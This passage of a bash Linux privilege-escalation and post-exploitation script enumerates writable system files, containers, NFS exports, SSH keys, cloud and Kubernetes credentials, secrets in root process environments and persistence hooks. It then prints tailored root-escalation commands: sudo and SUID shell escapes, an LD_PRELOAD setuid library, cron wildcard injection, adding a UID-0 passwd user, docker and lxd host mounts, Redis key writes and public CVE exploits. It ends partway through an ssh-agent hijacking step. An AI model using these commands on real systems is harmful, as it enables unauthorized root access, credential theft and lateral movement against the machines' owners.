[ -w /etc/passwd ]     && { find_ "/etc/passwd is WRITABLE -> add a UID 0 user"; flag PASSWD_WRITABLE "/etc/passwd"; }
[ -w /etc/shadow ]     && { find_ "/etc/shadow is WRITABLE"; flag SHADOW_WRITABLE "/etc/shadow"; }
[ -r /etc/shadow ] && [ "$(id -u 2>/dev/null)" != "0" ] && { find_ "/etc/shadow is READABLE by $WHO -> crack hashes"; flag SHADOW_READABLE "/etc/shadow"; }
[ -w /etc/sudoers ]    && { find_ "/etc/sudoers is WRITABLE"; flag SUDOERS_WRITABLE "/etc/sudoers"; }
info "World-writable files in sensitive dirs (sample):"
find /etc /usr/local /opt -writable -type f 2>/dev/null | sed 's/^/    /' | head -40
# Other users' home dirs you can read (creds, keys, notes).
while read -r h; do
  [ -z "$h" ] && continue
  case "$h" in /root|/home/*) [ -r "$h" ] && [ "$h" != "$HOME" ] && info "readable home: $h";; esac
done < <(awk -F: '$3>=0 && $6 ~ /^\/(home|root)/{print $6}' /etc/passwd 2>/dev/null | sort -u)

# ============================================================ containers
sec "Container / virtualization context"
if [ -f /.dockerenv ] || grep -qaE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null; then
  find_ "Running INSIDE a container - check for host mounts, caps, and the docker socket"; flag IN_CONTAINER "container"
fi
if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
  find_ "Writable /var/run/docker.sock -> spawn a privileged container to own the host"; flag DOCKER_SOCK "/var/run/docker.sock"
fi
# A container with CAP_SYS_ADMIN and no seccomp is a host-escape path.
info "capabilities of PID 1: $(grep -i cap /proc/1/status 2>/dev/null | tr '\n' ' ')"
have systemd-detect-virt && info "virt: $(systemd-detect-virt 2>/dev/null)"

# ============================================================ NFS / mounts
sec "Mounts & NFS exports"
info "mounts:"; mount 2>/dev/null | sed 's/^/    /' | head -40
cat_ /etc/fstab
if [ -r /etc/exports ]; then
  cat_ /etc/exports
  grep -q "no_root_squash" /etc/exports 2>/dev/null && { find_ "NFS export with no_root_squash -> drop a SUID-root binary from a client"; flag NFS_NOSQUASH "/etc/exports"; }
fi
# Mounts that grant power.
mount 2>/dev/null | grep -qE 'nosuid' || info "note: some mounts allow suid (default)"

# ============================================================ credential hunting
sec "Credential & secret hunting"
info "SSH / PEM private keys (triaged - encrypted? ready to use?):"
find / \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \
  -o -name '*.pem' -o -name '*.key' -o -name 'identity' \) -type f 2>/dev/null | while read -r k; do
  [ -r "$k" ] || continue
  head -c 64 "$k" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
  if grep -qE 'ENCRYPTED|Proc-Type:.*ENCRYPTED|bcrypt' "$k" 2>/dev/null; then
    find_ "Private key (ENCRYPTED): $k -> crack:  ssh2john $k > h; john --wordlist=rockyou.txt h  then use it"; flag SSH_KEY "$k (encrypted)"
  else
    who=""
    pub="${k}.pub"; [ -r "$pub" ] && who=" (pub: $(awk '{print $3}' "$pub" 2>/dev/null))"
    find_ "Private key (UNENCRYPTED, ready): $k$who -> chmod 600; ssh -i $k <user>@<host from known_hosts>"; flag SSH_KEY "$k (unencrypted)"
  fi
done
for f in /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" "$HOME/.ssh/config"; do [ -r "$f" ] && info "readable SSH file: $f"; done
info "History files:"
for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.python_history"; do
  [ -r "$f" ] && { info "    $f"; grep -iE 'pass|secret|token|key|-p |curl|wget|ssh ' "$f" 2>/dev/null | sed 's/^/      >> /' | head -15; }
done
info "Config files that often hold secrets:"
find / \( -name '*.env' -o -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' \
  -o -name 'config.php' -o -name 'database.yml' -o -name '.pgpass' -o -name '.netrc' \
  -o -name 'credentials' \) 2>/dev/null | sed 's/^/    /' | head -30
for d in "$HOME/.aws" "$HOME/.config/gcloud" "$HOME/.azure" "$HOME/.kube" "$HOME/.docker"; do
  [ -d "$d" ] && { find_ "Cloud/orchestration creds dir present: $d"; flag CLOUD_CREDS "$d"; }
done
# Named credential-store files (each is directly usable).
for f in "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pypirc" \
         "$HOME/.docker/config.json" "$HOME/.config/gh/hosts.yml" "$HOME/.config/hub" \
         "$HOME/.aws/credentials" "$HOME/.s3cfg" "$HOME/.boto" "$HOME/.rclone.conf"; do
  [ -r "$f" ] && { find_ "Credential store file: $f -> read it for reusable creds/tokens"; flag CRED_FILE "$f"; }
done
# Mail spools sometimes carry password resets / onboarding creds.
for m in /var/mail/* /var/spool/mail/*; do [ -r "$m" ] && [ -s "$m" ] && info "readable mail spool: $m"; done
# High-signal secret sweep: cloud keys, API tokens, JWTs, private keys, assignments.
# Bounded to likely locations; -I skips binaries; capped output.
sec "High-signal secrets (cloud keys, tokens, private keys)"
_HS='AKIA[0-9A-Z]{16}|aws_secret_access_key|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|gho_[0-9A-Za-z]{36}|glpat-[0-9A-Za-z_-]{20}|xox[baprs]-[0-9A-Za-z-]{10,}|sk-[A-Za-z0-9]{32,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|(pass(word|wd)?|secret|token|api[_-]?key|client_secret)[[:space:]]*[:=][[:space:]]*[^[:space:];,#]{4,}'
_hits=$(grep -rniIE "$_HS" /etc /opt /srv /var/www /home /root "$HOME" /tmp /run 2>/dev/null \
  | grep -viE 'recce-enum|/\.cache/|/proc/|Binary file' | head -50)
if [ -n "$_hits" ]; then printf '%s\n' "$_hits" | cut -c1-200 | sed 's/^/    /'; flag SECRETS_FOUND "high-signal regex hits (keys/tokens/creds)"; fi

# ============================================================ network
sec "Network"
info "interfaces:"; { ip -brief addr 2>/dev/null || ifconfig -a 2>/dev/null; } | sed 's/^/    /'
info "listening sockets:"; { ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null; } | sed 's/^/    /' | head -40
# Machine-parseable listener inventory the sheet backfills. For each listener we
# emit proto/addr/port + owning process + PID + the BACKING BINARY path - what a
# remote scan can't see (incl. loopback-only services). READ-ONLY: readlink of
# /proc/<pid>/exe and 'command -v', nothing written, nothing executed.
_backing_bin() {   # $1=pid $2=proc  -> best-effort absolute binary path
  _b=""
  [ -n "$1" ] && _b=$(readlink -f "/proc/$1/exe" 2>/dev/null)
  [ -z "$_b" ] && [ -n "$2" ] && _b=$(command -v "$2" 2>/dev/null)
  printf '%s' "$_b"
}
_emit_listeners() {   # $1=proto label; reads ss/netstat listener lines on stdin
  while IFS= read -r _l; do
    case "$_l" in State*|Netid*|Active*|Proto*) continue ;; esac
    # The local endpoint is the first field ending in :<number> (peer ends in :*).
    _ap=$(printf '%s\n' "$_l" | awk '{for(i=1;i<=NF;i++) if($i ~ /:[0-9]+$/){print $i; break}}')
    [ -z "$_ap" ] && continue
    _addr=${_ap%:*}; _port=${_ap##*:}
    case "$_port" in ''|*[!0-9]*) continue ;; esac
    _proc=$(printf '%s\n' "$_l" | sed -n 's/.*users:(("\([^"]*\)".*/\1/p')
    [ -z "$_proc" ] && _proc=$(printf '%s\n' "$_l" | sed -n 's#.*[0-9]/\([^ ]*\).*#\1#p')
    _pid=$(printf '%s\n' "$_l" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
    [ -z "$_pid" ] && _pid=$(printf '%s\n' "$_l" | grep -oE '[0-9]+/' | head -1 | tr -d /)
    _bin=$(_backing_bin "$_pid" "$_proc")
    printf '    LISTEN proto=%s addr=%s port=%s pid=%s proc=%s bin=%s\n' \
      "$1" "$_addr" "$_port" "${_pid:-}" "${_proc:-}" "${_bin:-}"
  done
}
info "listening-service inventory (proto/port/process/binary):"
if have ss; then
  ss -Hltnp 2>/dev/null | _emit_listeners tcp
  ss -Hlunp 2>/dev/null | _emit_listeners udp
else
  netstat -ltnp 2>/dev/null | _emit_listeners tcp
  netstat -lunp 2>/dev/null | _emit_listeners udp
fi
info "routes:"; { ip route 2>/dev/null || route -n 2>/dev/null; } | sed 's/^/    /'
cat_ /etc/hosts
info "ARP neighbours:"; { ip neigh 2>/dev/null || arp -a 2>/dev/null; } | sed 's/^/    /' | head -20

# ============================================================ lateral movement
sec "Lateral movement & pivoting"
# SSH trust graph: where THIS account can reach, and reusable onward auth.
for f in "$HOME/.ssh/config" /etc/ssh/ssh_config; do
  [ -r "$f" ] && { info "ssh client config: $f"; grep -iE '^[[:space:]]*(host|hostname|user|proxyjump|proxycommand|identityfile|controlpath)' "$f" 2>/dev/null | sed 's/^/      /' | head -30; }
done
for f in "$HOME/.ssh/known_hosts" /root/.ssh/known_hosts; do
  [ -r "$f" ] && { n=$(grep -c . "$f" 2>/dev/null); info "known_hosts $f: ${n:-0} entr(ies) - hosts this account has reached"; }
done
# A live ssh-agent socket authenticates onward with keys you can't even read.
if [ -n "$SSH_AUTH_SOCK" ] && [ -S "$SSH_AUTH_SOCK" ]; then
  find_ "ssh-agent socket live ($SSH_AUTH_SOCK) -> hijack to SSH onward as $WHO (ssh-add -l lists the keys)"; flag SSH_AGENT "$SSH_AUTH_SOCK"
fi
ls -la /tmp/ssh-*/agent.* 2>/dev/null | sed 's/^/    /' | head -5
# Kubernetes: an in-cluster service-account token authenticates to the API.
if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  find_ "Kubernetes service-account token readable (/var/run/secrets/kubernetes.io) -> query the cluster API (kubectl --token=...)"; flag K8S_TOKEN "serviceaccount token"
fi
for f in "$HOME/.kube/config" /etc/kubernetes/admin.conf; do [ -r "$f" ] && { find_ "kubeconfig readable: $f -> cluster access + workload pivot"; flag KUBECONFIG "$f"; }; done
# Config-management inventories/creds reach every managed node.
for d in /etc/ansible /etc/salt /etc/puppet /etc/puppetlabs; do
  [ -d "$d" ] && info "config-mgmt present: $d (inventory/creds -> push to managed nodes)"
done
[ -r /etc/ansible/hosts ] && { info "ansible inventory:"; grep -vE '^[[:space:]]*(#|$)' /etc/ansible/hosts 2>/dev/null | sed 's/^/      /' | head -20; }
# Dual-homed? Extra interfaces = a route into another segment.
nif=$( { ip -brief addr 2>/dev/null || ifconfig -a 2>/dev/null; } | grep -icE '^(eth|ens|enp|eno|wl|tun|tap)' )
if [ "${nif:-0}" -gt 1 ] 2>/dev/null; then find_ "Multiple network interfaces ($nif) -> this host is a pivot into another segment"; flag DUAL_HOMED "$nif interfaces"; fi
info "established connections (pivot leads):"; { ss -tnp state established 2>/dev/null || netstat -tnp 2>/dev/null | grep EST; } | sed 's/^/    /' | head -20
# DB client creds that also work against remote DB hosts.
for f in "$HOME/.pgpass" "$HOME/.my.cnf" "$HOME/.mylogin.cnf"; do [ -r "$f" ] && { find_ "DB client credential file: $f -> reuse against remote DB hosts"; flag DB_CREDS "$f"; }; done

# ============================================================ restricted shell
sec "Restricted shell & shell escape"
CUR_SHELL=$(getent passwd "$WHO" 2>/dev/null | awk -F: '{print $7}')
info "login shell: ${CUR_SHELL:-$SHELL}"
case "${CUR_SHELL:-$SHELL}" in
  *rbash|*rksh|*rzsh|*lshell|*rssh|*git-shell|*scponly)
    find_ "Restricted shell (${CUR_SHELL:-$SHELL}) -> escape via an allowed interpreter (vi/less/awk/find/man) or a PATH/SHELL export; see the how-to"; flag RESTRICTED_SHELL "${CUR_SHELL:-$SHELL}";;
esac
case "$-" in *r*) find_ "Current shell has the restricted flag set (\$- = $-) -> rbash-style jail"; flag RESTRICTED_SHELL "rbash (\$-=$-)";; esac
info "shells present (candidate escape interpreters): $(grep -vE '^[[:space:]]*#' /etc/shells 2>/dev/null | tr '\n' ' ')"

# ============================================================ persistence footholds
sec "Persistence footholds (writable login/boot hooks)"
# Read-only DETECTION of auto-run hooks: a persistence surface, and if a
# privileged user triggers one, an escalation path. Nothing is written.
for f in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc" \
         /etc/bash.bashrc /etc/profile /etc/zsh/zshrc /etc/environment; do
  [ -w "$f" ] && { find_ "Writable login-time file: $f (runs at shell/login start)"; flag WRITABLE_RC "$f"; }
done
for d in /etc/profile.d /etc/update-motd.d; do
  [ -d "$d" ] && while read -r w; do [ -n "$w" ] && { find_ "Writable login-time script: $w (root runs profile.d/update-motd at login)"; flag WRITABLE_RC "$w"; }; done < <(find "$d" -maxdepth 1 -type f -writable 2>/dev/null)
done
[ -w "$HOME/.ssh/authorized_keys" ] && { find_ "Writable ~/.ssh/authorized_keys -> add a key for silent re-entry as $WHO"; flag WRITABLE_AUTHKEYS "$HOME/.ssh/authorized_keys"; }
for f in /etc/pam.d/common-auth /etc/pam.d/sshd /etc/pam.d/sudo; do
  [ -w "$f" ] && { find_ "Writable PAM config: $f -> auth bypass / persistence"; flag PAM_WRITABLE "$f"; }
done
# Surface existing (possibly rogue) persistence.
for f in "$HOME/.ssh/authorized_keys" /root/.ssh/authorized_keys; do
  [ -r "$f" ] && { k=$(grep -c '.' "$f" 2>/dev/null); [ "${k:-0}" -gt 0 ] && info "authorized_keys $f: ${k} key(s) present"; }
done
have atq && { aq=$(atq 2>/dev/null); [ -n "$aq" ] && { info "at jobs queued:"; printf '%s\n' "$aq" | sed 's/^/    /'; }; }
[ -d "$HOME/.config/systemd/user" ] && info "user systemd units: $(ls "$HOME/.config/systemd/user/" 2>/dev/null | tr '\n' ' ')"
[ -d "$HOME/.config/autostart" ] && info "XDG autostart entries: $(ls "$HOME/.config/autostart" 2>/dev/null | tr '\n' ' ')"

# ============================================================ software / misc
sec "Installed software (versions -> match to CVEs offline)"
if have dpkg; then dpkg -l 2>/dev/null | awk '/^ii/{print $2" "$3}' | sed 's/^/    /' | head -80
elif have rpm; then rpm -qa --qf '%{NAME} %{VERSION}\n' 2>/dev/null | sed 's/^/    /' | head -80; fi

# ============================================================ deeper credential dive
sec "Kerberos tickets, keytabs & agent sockets"
find / \( -name '*.keytab' -o -name 'krb5cc_*' -o -name '*.ccache' \) 2>/dev/null | while read -r kt; do [ -n "$kt" ] && { find_ "Kerberos ticket/keytab: $kt"; flag KRB_TICKET "$kt"; }; done
[ -n "$KRB5CCNAME" ] && { find_ "KRB5CCNAME set: $KRB5CCNAME (usable Kerberos ticket)"; flag KRB_TICKET "$KRB5CCNAME"; }
ls -la /tmp/krb5cc_* /tmp/ssh-* 2>/dev/null | sed 's/^/    /' | head -10
info "Screen/tmux sockets (attach to another user's session):"
ls -la /var/run/screen/ /tmp/tmux-* 2>/dev/null | sed 's/^/    /' | head -10
info "GPG / keyrings:"
find / \( -name 'secring.gpg' -o -name 'pubring.kbx' -o -path '*/.gnupg/*' \) 2>/dev/null | sed 's/^/    /' | head -10

sec "Root process environments & open FDs (creds leak)"
# /proc/<pid>/environ of a root process you can read may hold DB/API secrets.
for pid in $(ps -eo pid,user 2>/dev/null | awk '$2=="root"{print $1}'); do
  if [ -r "/proc/$pid/environ" ]; then
    # The process may exit between the ps snapshot and this read; suppress the
    # resulting redirection error (and tr's) with a stderr-muted command group.
    leak=$( { tr '\0' '\n' <"/proc/$pid/environ"; } 2>/dev/null | grep -iE 'pass|secret|token|key|cred' )
    [ -n "$leak" ] && { find_ "Readable root env at /proc/$pid/environ:"; printf '%s\n' "$leak" | sed 's/^/      >> /' | head -8; flag PROC_ENV "/proc/$pid/environ"; }
  fi
done

sec "Web-app & service config files (often world-readable creds)"
find / \( -name 'tomcat-users.xml' -o -name 'context.xml' -o -name 'standalone.xml' \
  -o -name 'application.properties' -o -name 'application.yml' -o -name 'appsettings.json' \
  -o -name 'local.settings.json' -o -name 'docker-compose.yml' -o -name 'Dockerfile' \
  -o -name '.htpasswd' -o -name 'my.cnf' -o -name '.my.cnf' -o -name 'redis.conf' \) 2>/dev/null | sed 's/^/    /' | head -30
info "Backup / swap files that may contain secrets:"
find /etc /opt /var/www /home /srv \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.save' -o -name '*.swp' \) 2>/dev/null | sed 's/^/    /' | head -25

sec "Writable shared libraries & ld config"
cat_ /etc/ld.so.conf
for d in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null; echo /lib /usr/lib /usr/local/lib); do
  [ -d "$d" ] && [ -w "$d" ] && { find_ "Writable library dir: $d (drop a malicious .so a root binary loads)"; flag LIB_DIR_WRITABLE "$d"; }
done

sec "Environment variables (this shell)"
env 2>/dev/null | grep -viE '^(LS_COLORS|_=)' | sed 's/^/    /' | head -40

sec "Interesting recent & hidden files"
info "recently modified in /etc,/opt,/home (7d):"
find /etc /opt /home -type f -mtime -7 2>/dev/null | sed 's/^/    /' | head -30
info "world-writable dirs missing sticky bit (safe-to-abuse temp):"
find / -path /proc -prune -o -type d -perm -0002 ! -perm -1000 -print 2>/dev/null | sed 's/^/    /' | head -20

# ============================================================ how to exploit
# Tailored to the [!] findings above: only the vectors that ACTUALLY fired on
# this host are printed, with the specific file/binary/privilege substituted in,
# plus prereq -> command -> confirm -> cleanup. Read-only guidance that points at
# EXISTING public tools; nothing is generated or run for you.
sec "How to exploit (tailored to THIS host's findings)"
step() {  # step "Title" "line" "line" ...
  _emit ""; _emit "  ${C_F}>> $1${C_R}"; shift; for l in "$@"; do _emit "     $l"; done
}
list_() { pb_vals "$1" | sed 's/^/       - /'; }

if [ -z "$PB" ]; then
  _emit "  No known escalation vectors auto-matched. Still review every [!] line, run"
  _emit "  linux-exploit-suggester.sh offline against the kernel/software versions, and"
  _emit "  check sudo -l interactively (a password prompt may hide NOPASSWD entries)."
fi

if pb_has SUDO_ALL; then step "sudo (ALL) ALL -> instant root" \
  "prereq : your password (or NOPASSWD)." \
  "run    : sudo -i          # or:  sudo su -" \
  "confirm: id   ->  uid=0(root)"; fi

if pb_has SUDO_NOPASSWD; then step "NOPASSWD sudo binaries -> root via GTFOBins" \
  "found  : $(pb_vals SUDO_NOPASSWD)" \
  "prereq : the listed binary runs without a password." \
  "run    : look each up at  gtfobins.github.io/#<binary>  (Sudo section). Common:" \
  "           sudo find . -exec /bin/sh \\; -quit" \
  "           sudo vim -c ':!/bin/sh'          sudo awk 'BEGIN{system(\"/bin/sh\")}'" \
  "           sudo less /etc/profile  then  !/bin/sh      sudo env /bin/sh" \
  "confirm: id   ->  uid=0(root)"; fi

if pb_has SUDO_LDPRELOAD || pb_has SUDO_LDLIB; then step "sudo keeps LD_PRELOAD / LD_LIBRARY_PATH -> root" \
  "prereq : env_keep+=LD_PRELOAD (or LD_LIBRARY_PATH) in sudoers + one allowed sudo command." \
  "build  : cat > /tmp/x.c <<'EOF'" \
  "         #include <stdlib.h>" \
  "         void _init(){ setgid(0); setuid(0); system(\"/bin/bash -p\"); }" \
  "         EOF" \
  "         gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c" \
  "run    : sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>" \
  "confirm: id   ->  uid=0(root)     cleanup: rm /tmp/x.so /tmp/x.c"; fi

if pb_has SUDO_SAMEDIT; then step "sudo Baron Samedit (CVE-2021-3156) -> root" \
  "found  : $(pb_vals SUDO_SAMEDIT)" \
  "verify : sudoedit -s '\\' \$(python3 -c 'print(\"A\"*1000)')  -> a crash/segfault ~ vulnerable." \
  "run    : compile the public CVE-2021-3156 PoC that matches this libc, run it -> root shell." \
  "confirm: id   ->  uid=0(root)"; fi

if pb_has SUDO_22809; then step "sudoedit CVE-2023-22809 -> edit any root file" \
  "found  : sudo $(pb_vals SUDO_22809)" \
  "prereq : a sudoers rule granting sudoedit/-e on ANY file." \
  "run    : EDITOR='vim -- /etc/sudoers' sudoedit /path/you/are/allowed" \
  "         then add:  <you> ALL=(ALL) NOPASSWD:ALL   and  sudo -i" \
  "confirm: id   ->  uid=0(root)"; fi

if pb_has SUID_GTFO; then step "SUID root binary (GTFOBins) -> root  [EXACT command per binary]"; list_ SUID_GTFO
  step "  how" \
    "run    : each line above is the precise technique for THAT binary - run it as-is." \
    "confirm: id   ->  euid=0(root)"; fi

if pb_has SUID_CUSTOM; then step "Non-standard SUID root binary -> the analysis above found the vector"; list_ SUID_CUSTOM
  if pb_has SUID_PATH_HIJACK; then step "  PATH hijack (references a bare command name)"; list_ SUID_PATH_HIJACK
    step "  run" \
      "         echo '/bin/bash -p' > /tmp/<cmd>; chmod +x /tmp/<cmd>; PATH=/tmp:\$PATH <suid-bin>" \
      "confirm: id -> euid=0(root)"; fi
  if pb_has SUID_WRITABLE_HELPER; then step "  Writable helper/config it reads -> poison it"; list_ SUID_WRITABLE_HELPER; fi
  if pb_has SUID_ENV; then step "  Reads LD_* -> env injection"; list_ SUID_ENV
    step "  run" "         build the standard preload .so (see the sudo LD_PRELOAD step) and export it before running the binary."; fi
  step "  else" \
    "look   : strings <bin> (already run above); for dynamic behaviour, ltrace/strace it in a lab" \
    "         and watch for a relative exec / getenv() / a writable file it opens." \
    "confirm: id   ->  euid=0(root)"; fi

if pb_has CAP_SETUID; then step "cap_setuid capability -> root"; list_ CAP_SETUID
  step "  how" \
    "run (python): <capbin> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" \
    "run (perl)  : <capbin> -e 'use POSIX; setuid(0); exec \"/bin/bash\";'" \
    "confirm: id   ->  uid=0(root)"; fi

if pb_has CAP_DAC; then step "cap_dac_read_search / cap_dac_override -> read or overwrite any file"; list_ CAP_DAC
  step "  how" \
    "read   : the capable binary can read /etc/shadow (e.g. tar/xxd/cat)  -> crack, or" \
    "override: overwrite /etc/passwd with a UID-0 line (see the /etc/passwd step)." \
    "confirm: you can read /etc/shadow, or su to your injected root user"; fi

if pb_has CRON_WRITABLE; then step "Writable script run by a root cron -> root"; list_ CRON_WRITABLE
  step "  how" \
    "run    : echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> <writable-script>" \
    "wait   : until the cron fires (check the schedule)." \
    "confirm: /tmp/rootbash -p   then  id  ->  euid=0     cleanup: rm /tmp/rootbash + your line"; fi

if pb_has CRON_WILDCARD; then step "Cron wildcard injection (tar/rsync/chown) -> root"; list_ CRON_WILDCARD
  step "  how (tar --checkpoint example, in the dir the cron globs with *)" \
    "         echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh" \
    "         touch -- '--checkpoint=1'  '--checkpoint-action=exec=sh runme.sh'" \
    "wait   : the root cron's  tar ... *  executes runme.sh." \
    "confirm: /tmp/rb -p  ->  id  ->  euid=0    (rsync uses -e; chown/chmod use --reference)"; fi

if pb_has SVC_UNIT || pb_has ROOT_WRITABLE_BIN; then step "Writable systemd unit / root-run binary -> root"
  [ -n "$(pb_vals SVC_UNIT)" ] && list_ SVC_UNIT; [ -n "$(pb_vals ROOT_WRITABLE_BIN)" ] && list_ ROOT_WRITABLE_BIN
  step "  how" \
    "unit   : set  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb'" \
    "         then  systemctl daemon-reload && systemctl restart <svc>   (or wait for boot)" \
    "binary : overwrite the writable root-run binary with your payload; restart the service." \
    "confirm: /tmp/rb -p  ->  id  ->  euid=0"; fi

if pb_has PATH_WRITABLE; then step "Writable directory in PATH -> hijack -> root"; list_ PATH_WRITABLE
  step "  how" \
    "prereq : a root process/cron/SUID calls a command by name (no absolute path)." \
    "run    : put a script named <cmdname> in <dir> that runs:  cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb" \
    "         then  chmod +x <dir>/<cmdname>  and wait for the root job to call it." \
    "confirm: after it runs,  /tmp/rb -p  ->  id  ->  euid=0"; fi

if pb_has PASSWD_WRITABLE; then step "/etc/passwd writable -> add a root user" \
  "run    : echo \"r00t:\$(openssl passwd -1 -salt x Pass123):0:0::/root:/bin/bash\" >> /etc/passwd" \
  "confirm: su r00t   (password Pass123)  ->  id  ->  uid=0     cleanup: remove the line"; fi

if pb_has SUDOERS_WRITABLE; then step "/etc/sudoers writable -> grant yourself root" \
  "run    : echo \"$WHO ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers" \
  "confirm: sudo -i  ->  id  ->  uid=0     cleanup: remove the line"; fi

if pb_has SHADOW_WRITABLE; then step "/etc/shadow writable -> set a known root hash" \
  "run    : replace root's hash field with  \$(openssl passwd -6 Pass123)  (keep the : layout)" \
  "confirm: su root  (Pass123)     cleanup: restore the original hash"; fi

if pb_has SHADOW_READABLE; then step "/etc/shadow readable -> crack offline" \
  "run    : unshadow /etc/passwd /etc/shadow > hashes.txt" \
  "         john --wordlist=rockyou.txt hashes.txt      (or  hashcat -m 1800)" \
  "confirm: john --show hashes.txt  reveals a password  ->  su <user>"; fi

if pb_has LDPRELOAD_FILE; then step "/etc/ld.so.preload writable -> global SUID injection" \
  "build  : compile /tmp/x.so as in the sudo-LD_PRELOAD step (setuid(0);system(bash))." \
  "run    : echo /tmp/x.so >> /etc/ld.so.preload   then invoke any SUID binary (e.g. ping)" \
  "confirm: id  ->  uid=0     cleanup: remove the line + rm /tmp/x.so"; fi

if pb_has LIB_DIR_WRITABLE; then step "Writable shared-library directory -> .so hijack -> root"; list_ LIB_DIR_WRITABLE
  step "  how" \
    "prereq : a root binary loads a library from this dir (check with ldd / SONAME)." \
    "run    : place a malicious .so with the exact SONAME the binary loads (_init -> setuid(0);system)." \
    "confirm: run the root binary  ->  id  ->  uid=0"; fi

if pb_has DOCKER_GRP || pb_has DOCKER_SOCK; then step "docker group / writable docker.sock -> root on the host" \
  "run    : docker run -v /:/mnt --rm -it alpine chroot /mnt sh" \
  "         (no docker client? talk to the socket with curl --unix-socket /var/run/docker.sock)" \
  "confirm: you are root on the HOST filesystem under /mnt (cat /mnt/etc/shadow)"; fi

if pb_has LXD_GRP; then step "lxd/lxc group -> root via privileged container" \
  "run    : import a small image, then:" \
  "         lxc init myimg r -c security.privileged=true" \
  "         lxc config device add r host disk source=/ path=/mnt/root recursive=true" \
  "         lxc start r && lxc exec r /bin/sh" \
  "confirm: /mnt/root is the host FS, owned by root  (cat /mnt/root/etc/shadow)"; fi

if pb_has DISK_GRP; then step "disk group -> read any file off the raw device" \
  "run    : debugfs /dev/sda1 -R 'cat /etc/shadow'      (adjust the device from  mount)" \
  "confirm: shadow hashes printed  ->  crack offline (john/hashcat)"; fi

if pb_has NFS_NOSQUASH; then step "NFS no_root_squash -> root via a client-side SUID binary" \
  "prereq : root on any box that can mount the export." \
  "run    : (attacker, as root)  mount -t nfs <target>:/export /mnt" \
  "         cp /bin/bash /mnt/rb; chmod 4755 /mnt/rb" \
  "confirm: (on target)  /export/rb -p  ->  id  ->  euid=0"; fi

if pb_has PWNKIT; then step "PwnKit (CVE-2021-4034, pkexec) -> root"; list_ PWNKIT
  step "  how" \
    "prereq : polkit/pkexec unpatched (pre Jan-2022)." \
    "run    : compile the single-file public PwnKit PoC offline (gcc), run ./PwnKit." \
    "confirm: id  ->  uid=0(root)   (fixed: polkit 0.120-2 / distro patch)"; fi

if pb_has DIRTYPIPE; then step "Dirty Pipe (CVE-2022-0847) -> root"; list_ DIRTYPIPE
  step "  how" \
    "run    : compile the public Dirty Pipe PoC; point it at a SUID binary (e.g. /usr/bin/su)" \
    "         to overwrite a read-only page, or hijack /etc/passwd." \
    "confirm: the PoC drops a root shell  ->  id  ->  uid=0   (kernel 5.8-5.16.11)"; fi

if pb_has DIRTYCOW; then step "Dirty COW (CVE-2016-5195) -> root"; list_ DIRTYCOW
  step "  how" \
    "run    : compile a Dirty COW PoC (dirtyc0w / pokemon) offline; classic path overwrites" \
    "         /etc/passwd or a SUID binary via the copy-on-write race." \
    "confirm: root shell / injected passwd user   (kernel < 4.8.3; may be unstable - snapshot first)"; fi

if pb_has OVERLAYFS; then step "Ubuntu OverlayFS / GameOver(lay) -> root"; list_ OVERLAYFS
  step "  how" \
    "run    : Ubuntu-only public one-liners - OverlayFS CVE-2021-3493, or GameOver(lay)" \
    "         CVE-2023-2640 / CVE-2023-32629 (both have short public PoCs; no compiler needed for GameOverlay)." \
    "confirm: id  ->  uid=0(root)"; fi

if pb_has LOONEY; then step "Looney Tunables (CVE-2023-4911) -> root"; list_ LOONEY
  step "  how" \
    "run    : compile the public CVE-2023-4911 PoC (GLIBC_TUNABLES ld.so overflow) offline; run it." \
    "confirm: id  ->  uid=0(root)   (glibc 2.34-2.37 on the affected distros)"; fi

if pb_has KERNEL_OLD; then step "Old kernel -> suggested local exploit"; list_ KERNEL_OLD
  step "  how" \
    "run    : ./linux-exploit-suggester.sh   (offline) -> pick a 'highly probable' match," \
    "         compile the referenced public exploit, run it. Snapshot/VM first - some panic." \
    "confirm: id  ->  uid=0(root)"; fi

if pb_has MYSQL_ROOT; then step "MySQL/MariaDB as root -> UDF command exec" \
  "prereq : DB credentials (try blank/root, or creds found above)." \
  "run    : use the public lib_mysqludf_sys UDF -> SELECT sys_exec('cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb');" \
  "confirm: /tmp/rb -p  ->  id  ->  euid=0"; fi

if pb_has REDIS; then step "Unauthenticated Redis -> write a key/cron/authorized_keys"; list_ REDIS
  step "  how" \
    "run    : redis-cli -h <ip> CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys" \
    "         then SET a key holding your public SSH key and  SAVE." \
    "confirm: ssh -i <key> root@<ip>   (needs redis writable as root; else target web-root/cron)"; fi

if pb_has SSH_AGENT; then step "Live ssh-agent -> pivot onward as this user"; list_ SSH_AGENT
  step "  how" \
    "prereq : SSH_AUTH_SOCK points at a live agent (keys are held in memory, not on disk)." \
    "run    : SSH_AUTH_SOCK=<sock> ssh-add -l         # list the loaded identities" \
